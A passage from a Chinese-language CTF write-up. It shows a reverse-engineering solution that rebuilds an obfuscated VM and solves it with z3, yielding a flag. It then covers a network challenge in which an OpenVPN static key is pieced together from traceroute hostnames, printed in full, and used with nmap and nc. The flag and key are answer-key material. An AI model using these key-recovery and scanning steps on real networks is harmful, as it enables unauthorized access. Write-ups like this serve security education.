    57, 6, 88, 80, 88, 12, 37, 11, 6, 80], '58': [38, 56, 30, 58, 55, 79, 11, 7, 37, 80], '59': [30, 80, 69, 57, 80, 88, 85, 53, 81, 59], '60': [50, 72, 59, 22, 89, 27, 22, 25, 33, 96], '61': [97, 63, 50, 93, 20, 94, 72, 64, 21, 94], '62': [], '63': [89, 9, 85, 57, 56, 79, 99, 91, 26, 53], '64': [69, 12, 52, 69, 24, 88, 79, 53, 64, 52], '65': [35, 49, 78, 22, 27, 27, 78, 52, 13, 78], '66': [48, 79, 38, 48, 48, 28, 16, 97, 96, 16], '67': [96, 36, 47, 100, 47, 41, 26, 100, 100, 47], '68': [17, 63, 16, 23, 68, 25, 74, 16, 97, 48], '69': [85, 41, 69, 82, 81, 26, 86, 88, 69, 87], '70': [55, 72, 100, 100, 21, 1, 2, 21, 100, 21], '71': [97, 69, 66, 44, 74, 49, 22, 100, 100, 24], '72': [30, 25, 99, 62, 8, 101, 8, 72, 72, 78], '73': [24, 54, 70, 11, 51, 62, 88, 25, 46, 14], '74': [22, 59, 68, 34, 58, 61, 67, 85, 18, 57], '75': [10, 36, 7, 60, 23, 42, 89, 91, 100, 27], '76': [82, 71, 31, 77, 84, 53, 73, 87, 26, 25], '77': [86, 30, 82, 66, 63, 69, 53, 64, 84, 20], '78': [14, 27, 27, 10, 22, 27, 66, 27, 14, 27], '79': [30, 32, 24, 102, 103, 79, 85, 58, 30, 83], '80': [87, 53, 59, 59, 81, 53, 64, 42, 104, 80], '81': [84, 38, 81, 79, 24, 69, 83, 80, 77, 24], '82': [77, 52, 83, 69, 104, 38, 12, 26, 77, 54], '83': [81, 64, 52, 26, 33, 102, 105, 52, 106, 22], '84': [107, 89, 84, 102, 25, 43, 85, 81, 95, 55], '85': [52, 87, 85, 93, 9, 105, 84, 43, 43, 81], '86': [77, 81, 84, 86, 68, 101, 35, 93, 26, 10], '87': [58, 39, 59, 6, 30, 87, 88, 64, 55, 58], '88': [80, 11, 64, 69, 55, 55, 59, 52, 38, 59], '89': [108, 1, 74, 17, 28, 17, 18, 99, 42, 9], '90': [36, 12, 38, 96, 68, 4, 66, 11, 85, 14], '91': [36, 47, 15, 9, 84, 100, 36, 92, 54, 84], '92': [45, 2, 22, 70, 93, 78, 63, 101, 33, 9], '93': [79, 57, 79, 93, 109, 42, 95, 79, 55, 93], '94': [94, 94, 94, 41, 61, 78, 94, 61, 94, 94], '95': [47, 79, 65, 20, 40, 20, 12, 24, 83, 81], '96': [67, 14, 23, 74, 4, 30, 29, 33, 93, 4], '97': [110, 30, 91, 55, 37, 21, 101, 67, 9, 17], '98': [31, 79, 3, 47, 85, 85, 22, 40, 70, 91], '99': [68, 16, 21, 9, 80, 11, 19, 23, 32, 68], '100': [16, 96, 16, 17, 74, 48, 28, 10, 1, 28], '101': [68, 70, 34, 48, 37, 101, 62, 43, 111, 10], '102': [68, 24, 83, 41, 90, 97, 38, 112, 103, 97], '103': [37, 85, 75, 23, 19, 31, 80, 43, 5, 80], '104': [7, 35, 60, 66, 52, 94, 20, 64, 7, 21], '105': [39, 26, 5, 55, 38, 34, 88, 86, 113, 68], '106': [79, 85, 49, 73, 79, 80, 71, 24, 24, 48], '107': [12, 105, 2, 5, 92, 94, 99, 9, 68, 7], '108': [2, 18, 29, 29, 89, 43, 71, 20, 104, 91], '109': [48, 43, 79, 42, 96, 36, 69, 30, 69, 23], '110': [83, 94, 34, 55, 66, 84, 50, 57, 100, 45], '111': [59, 2, 12, 51, 91, 31, 25, 37, 59, 39], '112': [35, 83, 53, 64, 52, 80, 43, 62, 50, 13], '113': [3, 45, 84, 73, 71, 14, 35, 31, 44, 70]}
functions = [29055, 27592, 13322, 10519, 11699, 25139, 20259, 5880, 7714, 12164, 21929, 24654, 14117, 8117, 9253, 27929, 28821, 9892, 16142, 9649, 17148, 20991, 22134, 25811, 12376, 14681, 17346, 15944, 9435, 7912, 20482, 10097, 15121, 28152, 17999, 25331, 7376, 6732, 26053, 6287, 28598, 23700, 27255, 18963, 4974, 18686, 22579, 13669, 15344, 29260, 15746, 16587, 24916, 8578, 26276, 14454,
             21229, 9015, 17776, 24155, 11015, 27057, 9242, 5434, 11476, 13064, 10777, 30487, 29557, 25554, 22356, 11229, 30729, 23471, 10314, 22823, 21452, 19992, 23917, 8346, 24412, 7153, 18222, 23209, 12599, 6930, 26523, 29794, 6509, 14923, 4776, 16810, 18459, 28375, 17578, 26790, 6078, 30961, 13883, 19794, 8801, 15548, 12822, 20739, 30017, 11922, 21706, 5648, 19596, 16340, 30264, 5232, 4553, 19215]
operand = {0: 'byte_B080[byte_B0B2] = 0', 1: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = ((int)*((unsigned __int8 *)&unk_B040 + (unsigned __int8)byte_B072) >> byte_B080[byte_B0B2]) | (*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) << (8 - byte_B080[byte_B0B2]))', 2: 'byte_B080[byte_B0B2] = syscall', 3: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) ^= byte_B080[byte_B0B2]', 4: '++byte_B080[byte_B0B2]', 5: '--byte_B0B2', 6: '++byte_B080[byte_B0B2]', 7: '--byte_B0B2', 8: '--byte_B0B2', 9: '++byte_B0B2', 10: 'byte_B080[byte_B0B2] = 0', 11: '++byte_B080[byte_B0B2]', 12: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = ((int)*((unsigned __int8 *)&unk_B040 + (unsigned __int8)byte_B072) >> byte_B080[byte_B0B2]) | (*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) << (8 - byte_B080[byte_B0B2]))', 13: 'byte_B080[byte_B0B2] = *((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072)', 14: '++byte_B072', 15: '++byte_B080[byte_B0B2]', 16: 'byte_B080[byte_B0B2] = 0', 17: 'byte_B080[byte_B0B2] = 0', 18: '++byte_B0B2', 19: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = byte_B080[byte_B0B2]', 20: '++byte_B0B2', 21: 'if ( (char)byte_B080[byte_B0B2] < 0 ): rand();', 22: '++byte_B0B2', 23: '++byte_B0B2', 24: '++byte_B080[byte_B0B2]', 25: '++byte_B0B2', 26: '++byte_B080[byte_B0B2]', 27: '++byte_B072', 28: 'byte_B080[byte_B0B2] = 0', 29: 'byte_B080[byte_B0B2] = 0', 30: '++byte_B080[byte_B0B2]', 31: '++byte_B072', 32: '++byte_B080[byte_B0B2]', 33: '++byte_B080[byte_B0B2]', 34: '++byte_B080[byte_B0B2]', 35: '++byte_B080[byte_B0B2]', 36: 'byte_B080[byte_B0B2] = syscall', 37: '--byte_B0B2', 38: '++byte_B080[byte_B0B2]', 39: '++byte_B080[byte_B0B2]', 40: '++byte_B080[byte_B0B2]', 41: '--byte_B0B2', 42: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = ((int)*((unsigned __int8 *)&unk_B040 + (unsigned __int8)byte_B072) >> byte_B080[byte_B0B2]) | (*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) << (8 - byte_B080[byte_B0B2]))', 43: '++byte_B080[byte_B0B2]', 44: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) ^= byte_B080[byte_B0B2]', 45: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) ^= byte_B080[byte_B0B2]', 46: 'byte_B080[byte_B0B2] = 0', 47: 'if ( (char)byte_B080[byte_B0B2] < 0 ): rand();', 48: 'byte_B080[byte_B0B2] = 0', 49: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) ^= byte_B080[byte_B0B2]', 50: '++byte_B0B2', 51: '++byte_B080[byte_B0B2]',
           52: '++byte_B080[byte_B0B2]', 53: '++byte_B080[byte_B0B2]', 54: '++byte_B080[byte_B0B2]', 55: '++byte_B080[byte_B0B2]', 56: '++byte_B080[byte_B0B2]', 57: '++byte_B080[byte_B0B2]', 58: '++byte_B080[byte_B0B2]', 59: '++byte_B080[byte_B0B2]', 60: 'byte_B080[byte_B0B2] = 0', 61: '--byte_B072', 62: 'empty', 63: 'byte_B080[byte_B0B2] = 0', 64: '++byte_B080[byte_B0B2]', 65: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) ^= byte_B080[byte_B0B2]', 66: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = byte_B080[byte_B0B2]', 67: '--byte_B080[byte_B0B2]', 68: '++byte_B0B2', 69: '++byte_B080[byte_B0B2]', 70: '--byte_B080[byte_B0B2]', 71: '--byte_B080[byte_B0B2]', 72: '--byte_B0B2', 73: 'byte_B080[byte_B0B2] = *((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072)', 74: 'byte_B080[byte_B0B2] = 0', 75: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = ((int)*((unsigned __int8 *)&unk_B040 + (unsigned __int8)byte_B072) >> byte_B080[byte_B0B2]) | (*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) << (8 - byte_B080[byte_B0B2]))', 76: 'byte_B080[byte_B0B2] = 0', 77: '++byte_B080[byte_B0B2]', 78: 'byte_B080[byte_B0B2] = *((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072)', 79: '++byte_B080[byte_B0B2]', 80: '++byte_B080[byte_B0B2]', 81: '++byte_B080[byte_B0B2]', 82: '++byte_B080[byte_B0B2]', 83: '++byte_B080[byte_B0B2]', 84: '++byte_B080[byte_B0B2]', 85: '++byte_B080[byte_B0B2]', 86: '++byte_B080[byte_B0B2]', 87: '++byte_B080[byte_B0B2]', 88: '++byte_B080[byte_B0B2]', 89: '++byte_B0B2', 90: '++byte_B072', 91: 'byte_B080[byte_B0B2] = syscall', 92: '++byte_B0B2', 93: '++byte_B080[byte_B0B2]', 94: '--byte_B072', 95: '++byte_B080[byte_B0B2]', 96: 'byte_B080[byte_B0B2] = 0', 97: 'byte_B080[byte_B0B2] = 0', 98: 'byte_B080[byte_B0B2] = 0', 99: '++byte_B072', 100: 'if ( (char)byte_B080[byte_B0B2] < 0 ): rand();', 101: '--byte_B0B2', 102: '++byte_B080[byte_B0B2]', 103: '++byte_B080[byte_B0B2]', 104: '++byte_B0B2', 105: '++byte_B080[byte_B0B2]', 106: '++byte_B080[byte_B0B2]', 107: '++byte_B080[byte_B0B2]', 108: '++byte_B0B2', 109: '++byte_B080[byte_B0B2]', 110: '--byte_B080[byte_B0B2]', 111: '--byte_B0B2', 112: '++byte_B080[byte_B0B2]', 113: '*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) = ((int)*((unsigned __int8 *)&unk_B040 + (unsigned __int8)byte_B072) >> byte_B080[byte_B0B2]) | (*((_BYTE *)&unk_B040 + (unsigned __int8)byte_B072) << (8 - byte_B080[byte_B0B2]))'}
clist = f"""
#include<iostream>
#include <stdlib.h>
#include<vector>
using namespace std;

int table[50]={{0}};
int tindex = 0;
bool dbg = 0;
"""
for i in range(len(functions)):
    clist += f"""
void f{i}();
    """
for i in range(len(functions)):
    if i == 62:
        clist += """
void f62(){{
    return;
}}
        """
        continue

    clist += f"""
void f{i}(){{"""

    if operand[i] == "++byte_B080[byte_B0B2]":
        clist += f"""
    ++table[tindex];
        """
    if operand[i] == "byte_B080[byte_B0B2] = 0":
        clist += f"""
    table[tindex] = 0;
        """
    if operand[i] == "++byte_B0B2":
        clist += f"""
    ++tindex;
        """
    if operand[i] == "--byte_B0B2":
        clist += f"""
    --tindex;
        """
    if operand[i] == "--byte_B080[byte_B0B2]":
        clist += f"""
    --table[tindex];
        """
    if operand[i][:2] == "if":
        clist += f"""
    if(table[tindex] == -1 || dbg == 1){{
        cout<<"table[tindex] == "<<table[tindex]<<" do the rand() "<<'\\t';
        table[tindex] == 0;
        rand();
    }}
    else if(table[tindex] == 101 && dbg == 0){{
        cout<<"table[tindex] == "<<table[tindex]<<'\\t';
        dbg = 1;
        table[tindex] == 0;
    }}
        """
    clist += f"""
    vector<void(*)()> m_vecFuc;
    cout<<"{operand[i]}"<<endl;
    m_vecFuc.push_back(f{function_dict[str(i)][0]});
    m_vecFuc.push_back(f{function_dict[str(i)][1]});
    m_vecFuc.push_back(f{function_dict[str(i)][2]});
    m_vecFuc.push_back(f{function_dict[str(i)][3]});
    m_vecFuc.push_back(f{function_dict[str(i)][4]});
    m_vecFuc.push_back(f{function_dict[str(i)][5]});
    m_vecFuc.push_back(f{function_dict[str(i)][6]});
    m_vecFuc.push_back(f{function_dict[str(i)][7]});
    m_vecFuc.push_back(f{function_dict[str(i)][8]});
    m_vecFuc.push_back(f{function_dict[str(i)][9]});
    return m_vecFuc[rand() % 10]();
}}
        """
clist += f"""
int main(){{
    srand(0xD33B470u);
    f0();
}}
"""
with open('./funcs.cpp', 'w') as f:
    f.write(clist)
    # 生成funcs.cpp文件
```

中间有控制流的变换，调用了ptrace，然后随便分析一下，去掉了rand的部分，这些部分对操作没有影响

```php
read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 3
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))
tmp[tmp_index] ^= reg[rindex]

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 5
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 6
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 7
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))
tmp[tmp_index] ^= reg[rindex]

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 4
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))
tmp[tmp_index] ^= reg[rindex]

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 4
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 7
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))
tmp[tmp_index] ^= reg[rindex]

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 7
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 2
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 4
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 4
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))

read 1 byte from input

tmp[tmp_index] ^= reg[rindex]
++tmp_index
tmp[tmp_index] = reg[rindex]
reg[rindex] = 0
reg[rindex] += 7
tmp[tmp_index] = (tmp[tmp_index] >> reg[rindex]) | (tmp[tmp_index] << (8 - reg[rindex]))
tmp[tmp_index] ^= reg[rindex]

tmp_index -= 11
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
++tmp_index
tmp[tmp_index] ^= reg[rindex]
```

z3

```php
from z3 import *
enc = [0x9D, 0x6B, 0xA1, 0x02, 0xD7, 0xED, 0x40, 0xF6, 0x0E, 0xAE, 0x84, 0x19]

s = Solver()
dec = [BitVec(('x%s' % i), 8) for i in range(12)]
tmp = [0]*13
tmp_index = 0
reg = [0]*12
rindex = 0

tmp[tmp_index] ^= dec[0]
tmp_index += 1
tmp[tmp_index] = dec[0]
tmp[tmp_index] = (tmp[tmp_index] >> 3) | (tmp[tmp_index] << (8 - 3))
tmp[tmp_index] ^= 3

tmp[tmp_index] ^= dec[1]
tmp_index += 1
tmp[tmp_index] = dec[1]
tmp[tmp_index] = (tmp[tmp_index] >> 5) | (tmp[tmp_index] << (8 - 5))

tmp[tmp_index] ^= dec[2]
tmp_index += 1
tmp[tmp_index] = dec[2]
tmp[tmp_index] = (tmp[tmp_index] >> 6) | (tmp[tmp_index] << (8 - 6))

tmp[tmp_index] ^= dec[3]
tmp_index += 1
tmp[tmp_index] = dec[3]
tmp[tmp_index] = (tmp[tmp_index] >> 7) | (tmp[tmp_index] << (8 - 7))
tmp[tmp_index] ^= 7

tmp[tmp_index] ^= dec[4]
tmp_index += 1
tmp[tmp_index] = dec[4]
tmp[tmp_index] = (tmp[tmp_index] >> 4) | (tmp[tmp_index] << (8 - 4))
tmp[tmp_index] ^= 4

tmp[tmp_index] ^= dec[5]
tmp_index += 1
tmp[tmp_index] = dec[5]
tmp[tmp_index] = (tmp[tmp_index] >> 4) | (tmp[tmp_index] << (8 - 4))

tmp[tmp_index] ^= dec[6]
tmp_index += 1
tmp[tmp_index] = dec[6]
tmp[tmp_index] = (tmp[tmp_index] >> 7) | (tmp[tmp_index] << (8 - 7))
tmp[tmp_index] ^= 7

tmp[tmp_index] ^= dec[7]
tmp_index += 1
tmp[tmp_index] = dec[7]
tmp[tmp_index] = (tmp[tmp_index] >> 7) | (tmp[tmp_index] << (8 - 7))

tmp[tmp_index] ^= dec[8]
tmp_index += 1
tmp[tmp_index] = dec[8]
tmp[tmp_index] = (tmp[tmp_index] >> 2) | (tmp[tmp_index] << (8 - 2))

tmp[tmp_index] ^= dec[9]
tmp_index += 1
tmp[tmp_index] = dec[9]
tmp[tmp_index] = (tmp[tmp_index] >> 4) | (tmp[tmp_index] << (8 - 4))

tmp[tmp_index] ^= dec[10]
tmp_index += 1
tmp[tmp_index] = dec[10]
tmp[tmp_index] = (tmp[tmp_index] >> 4) | (tmp[tmp_index] << (8 - 4))

tmp[tmp_index] ^= dec[11]
tmp_index += 1
tmp[tmp_index] = dec[11]
tmp[tmp_index] = (tmp[tmp_index] >> 7) | (tmp[tmp_index] << (8 - 7))
tmp[tmp_index] ^= 7

tmp_index -= 11
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]
reg[rindex] = tmp[tmp_index]
tmp_index += 1
tmp[tmp_index] ^= reg[rindex]

out = []
for i in range(12):
    s.add(tmp[i+1] == enc[i])
if s.check() == sat:
    result = s.model()
    print(result)
    for i in range(12):
        out.append(result[dec[i]].as_long())
        print('0x{:02x}'.format(out[i]), end=', ')
else:
    print("failed")

# d3ctf{m3owJumpVmvM}
```

0x04 Misc
---------

### **O!!!SPF!!!!!! Enhanced**

> I'm apologized for the missing part of the treasure map. Luckily this is a way to recover it. 2a13:b487:11aa::d3:c7f:2f will tell you the key at its path. But it seems not easy to reach it?
> 
> The dungeon and the flag inside it is waiting for you.

题目给了一个OpenVPN 配置文件和go文件，先改IP:PORT...

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714319556786-a3a02726-71b4-400a-ac97-04037520ce0d.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714319556949-34f61541-2937-4e75-bcf6-722d26d80f07.png)

缺了静态密钥，连不上VPN，怎么弄到这个key???

`2a13:b487:11aa::d3:c7f:2f`显然是一个IPV6地址，一开始以为得开了vpn后才能访问，后面发现这ip是可以扫的

注意到有 PTR aaf26d2a066ce6356487ead9551fda4c

题目的its path 是否指路由路径？tracert一下，出货啦！

```php
13    34 ms    34 ms    34 ms  cernet2.net [2001:252:0:2::101]
14    34 ms    34 ms    34 ms  cernet2.net [2001:252:0:109::2]
15     *        *        *     请求超时。
16     *        *        *     请求超时。
17   215 ms   214 ms   215 ms  e0-34.core1.las1.he.net [2001:470:0:4ba::2]
18   214 ms   214 ms   214 ms  frantech-solutions.e0-25.core1.las1.he.net [2001:470:1:964::2]
19   214 ms   213 ms   213 ms  2605:6400:20:1ac::d3:c7f
20   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:1
21   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:2
22   213 ms   213 ms   214 ms  2a13:b487:11aa::d3:c7f:3
23   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:4
24   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:5
25   214 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:6
26   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:7
27   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:8
28   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:9
29   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:a
30   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:b
31   213 ms   214 ms   213 ms  2a13:b487:11aa::d3:c7f:c
32   214 ms   214 ms   215 ms  2a13:b487:11aa::d3:c7f:d
33   214 ms   215 ms   214 ms  2a13:b487:11aa::d3:c7f:e
34   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:f
35   215 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:10
36   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:11
37   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:12
38   215 ms   215 ms   214 ms  2a13:b487:11aa::d3:c7f:13
39   215 ms   214 ms   215 ms  2a13:b487:11aa::d3:c7f:14
40   214 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:15
41   215 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:16
42   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:17
43   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:18
44   214 ms   213 ms   214 ms  2a13:b487:11aa::d3:c7f:19
45   213 ms   214 ms   213 ms  2a13:b487:11aa::d3:c7f:1a
46   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:1b
47   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:1c
48   214 ms   214 ms   214 ms  2a13:b487:11aa::d3:c7f:1d
49   213 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:1e
50   214 ms   213 ms   213 ms  2a13:b487:11aa::d3:c7f:1f
51   213 ms   213 ms   213 ms  bd23ff4fb2b7f8e49200c3801151663d [2a13:b487:11aa::d3:c7f:20]
52   214 ms   214 ms   214 ms  0dcc848e1b075bd4dcb4fd32712559de [2a13:b487:11aa::d3:c7f:21]
53   215 ms   214 ms   214 ms  207bb8777d7fbedcc7e83c48c31b2bda [2a13:b487:11aa::d3:c7f:22]
54   213 ms   214 ms   213 ms  172602638c6a7c8fe61b4ff086c47690 [2a13:b487:11aa::d3:c7f:23]
55   214 ms   214 ms   214 ms  1c9ec648853b2bc316b58923505cbe6b [2a13:b487:11aa::d3:c7f:24]
56   213 ms   214 ms   213 ms  902c1f0809152f0a868c4cda66df19ad [2a13:b487:11aa::d3:c7f:25]
57   213 ms   213 ms   214 ms  d0b1da1c5e7fa0af81843735cefcf132 [2a13:b487:11aa::d3:c7f:26]
58   214 ms   214 ms   214 ms  4aea04f4b1076a844fbf5f69e2a7c420 [2a13:b487:11aa::d3:c7f:27]
59   214 ms   214 ms   214 ms  8d2dc7d91e3f6fe5ccd0fccd280aadc2 [2a13:b487:11aa::d3:c7f:28]
60   213 ms   213 ms   214 ms  5cd04243410e2e3372cf91a8395b4d1a [2a13:b487:11aa::d3:c7f:29]
61   213 ms   213 ms   213 ms  b70828d9f6a7a2aff81b0127af493d23 [2a13:b487:11aa::d3:c7f:2a]
62   214 ms   214 ms   214 ms  7305c7d7c018bbb1a557fee33b7372d5 [2a13:b487:11aa::d3:c7f:2b]
63   213 ms   213 ms   213 ms  aca7bfae5d337bdcc196e37dc363789d [2a13:b487:11aa::d3:c7f:2c]
64   214 ms   214 ms   214 ms  73c0791483a0b208f538892cf61fcf11 [2a13:b487:11aa::d3:c7f:2d]
65   217 ms   215 ms   213 ms  7d1ee65385eef03d533a94b03324bd01 [2a13:b487:11aa::d3:c7f:2e]
66   214 ms   214 ms   214 ms  aaf26d2a066ce6356487ead9551fda4c [2a13:b487:11aa::d3:c7f:2f]
```

补全一下：

```php
<tls-crypt>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
bd23ff4fb2b7f8e49200c3801151663d
0dcc848e1b075bd4dcb4fd32712559de
207bb8777d7fbedcc7e83c48c31b2bda
172602638c6a7c8fe61b4ff086c47690
1c9ec648853b2bc316b58923505cbe6b
902c1f0809152f0a868c4cda66df19ad
d0b1da1c5e7fa0af81843735cefcf132
4aea04f4b1076a844fbf5f69e2a7c420
8d2dc7d91e3f6fe5ccd0fccd280aadc2
5cd04243410e2e3372cf91a8395b4d1a
b70828d9f6a7a2aff81b0127af493d23
7305c7d7c018bbb1a557fee33b7372d5
aca7bfae5d337bdcc196e37dc363789d
73c0791483a0b208f538892cf61fcf11
7d1ee65385eef03d533a94b03324bd01
aaf26d2a066ce6356487ead9551fda4c
-----END OpenVPN Static key V1-----
</tls-crypt>
```

链接上了！

修好配置文件，注意替换IP和端口！！！

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714319629088-128655c6-9472-4dde-bc5d-447019ca0d37.png)

nmap扫网段，得到：

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714319635140-19004944-8541-4c3f-ac94-d25e3c6b5883.png)

`nc 100.64.11.2 18080`，进入二阶段，需要发送32字节的dummy来确认连接，随后会有一个 raw byte 的值回来，需要pwn库搞点事

```php
func handleConn(c net.Conn) {
    defer c.Close()

    // convince the client that we are the real server
    var challenge [32]byte
    _, err := io.ReadFull(c, challenge[:])
    if err != nil {
        log.Println(err)
        return
    }

    authSigner := hmac.New(sha256.New, []byte(AuthKey))
    authSigner.Write(challenge[:])

    if _, err := c.Write(append(authSigner.Sum(nil))); err != nil {
        log.Println(err)
        return
    }

    // game start message
    _, err = c.Write([]byte("I will send you messages, please reply me the salted hash for confirming. 
    To Players: You are not supposed guess the salt.\n"))
    if err != nil {
        log.Println(err)
        return
    }

    // game loop
    for _, msg := range RandOrder(msgs) {
        _, err = c.Write([]byte(msg + "\n"))
        if err != nil {
            log.Println(err)
            return
        }

        var rec [32]byte
        _, err := io.ReadFull(c, rec[:])
        if err != nil {
            log.Println(err)
            return
        }

        if slices.Compare(rec[:], Sign([]byte(msg))) != 0 {
            _, err = c.Write([]byte("Wrong Hash\n"))
            if err != nil {
                log.Println(err)
                return
            }
        }
    }

    // game end message
    _, err = c.Write([]byte{'\n'})
    if err != nil {
        log.Println(err)
    }

    // game reward
    _, err = c.Write([]byte("Would you like to have a flag?(Y/N)\n"))
    if err != nil {
        log.Println(err)
        return
    }

    var getFlag [1]byte
    _, err = io.ReadFull(c, getFlag[:])
    if err != nil {
        if err != io.EOF {
            log.Println(err)
        }
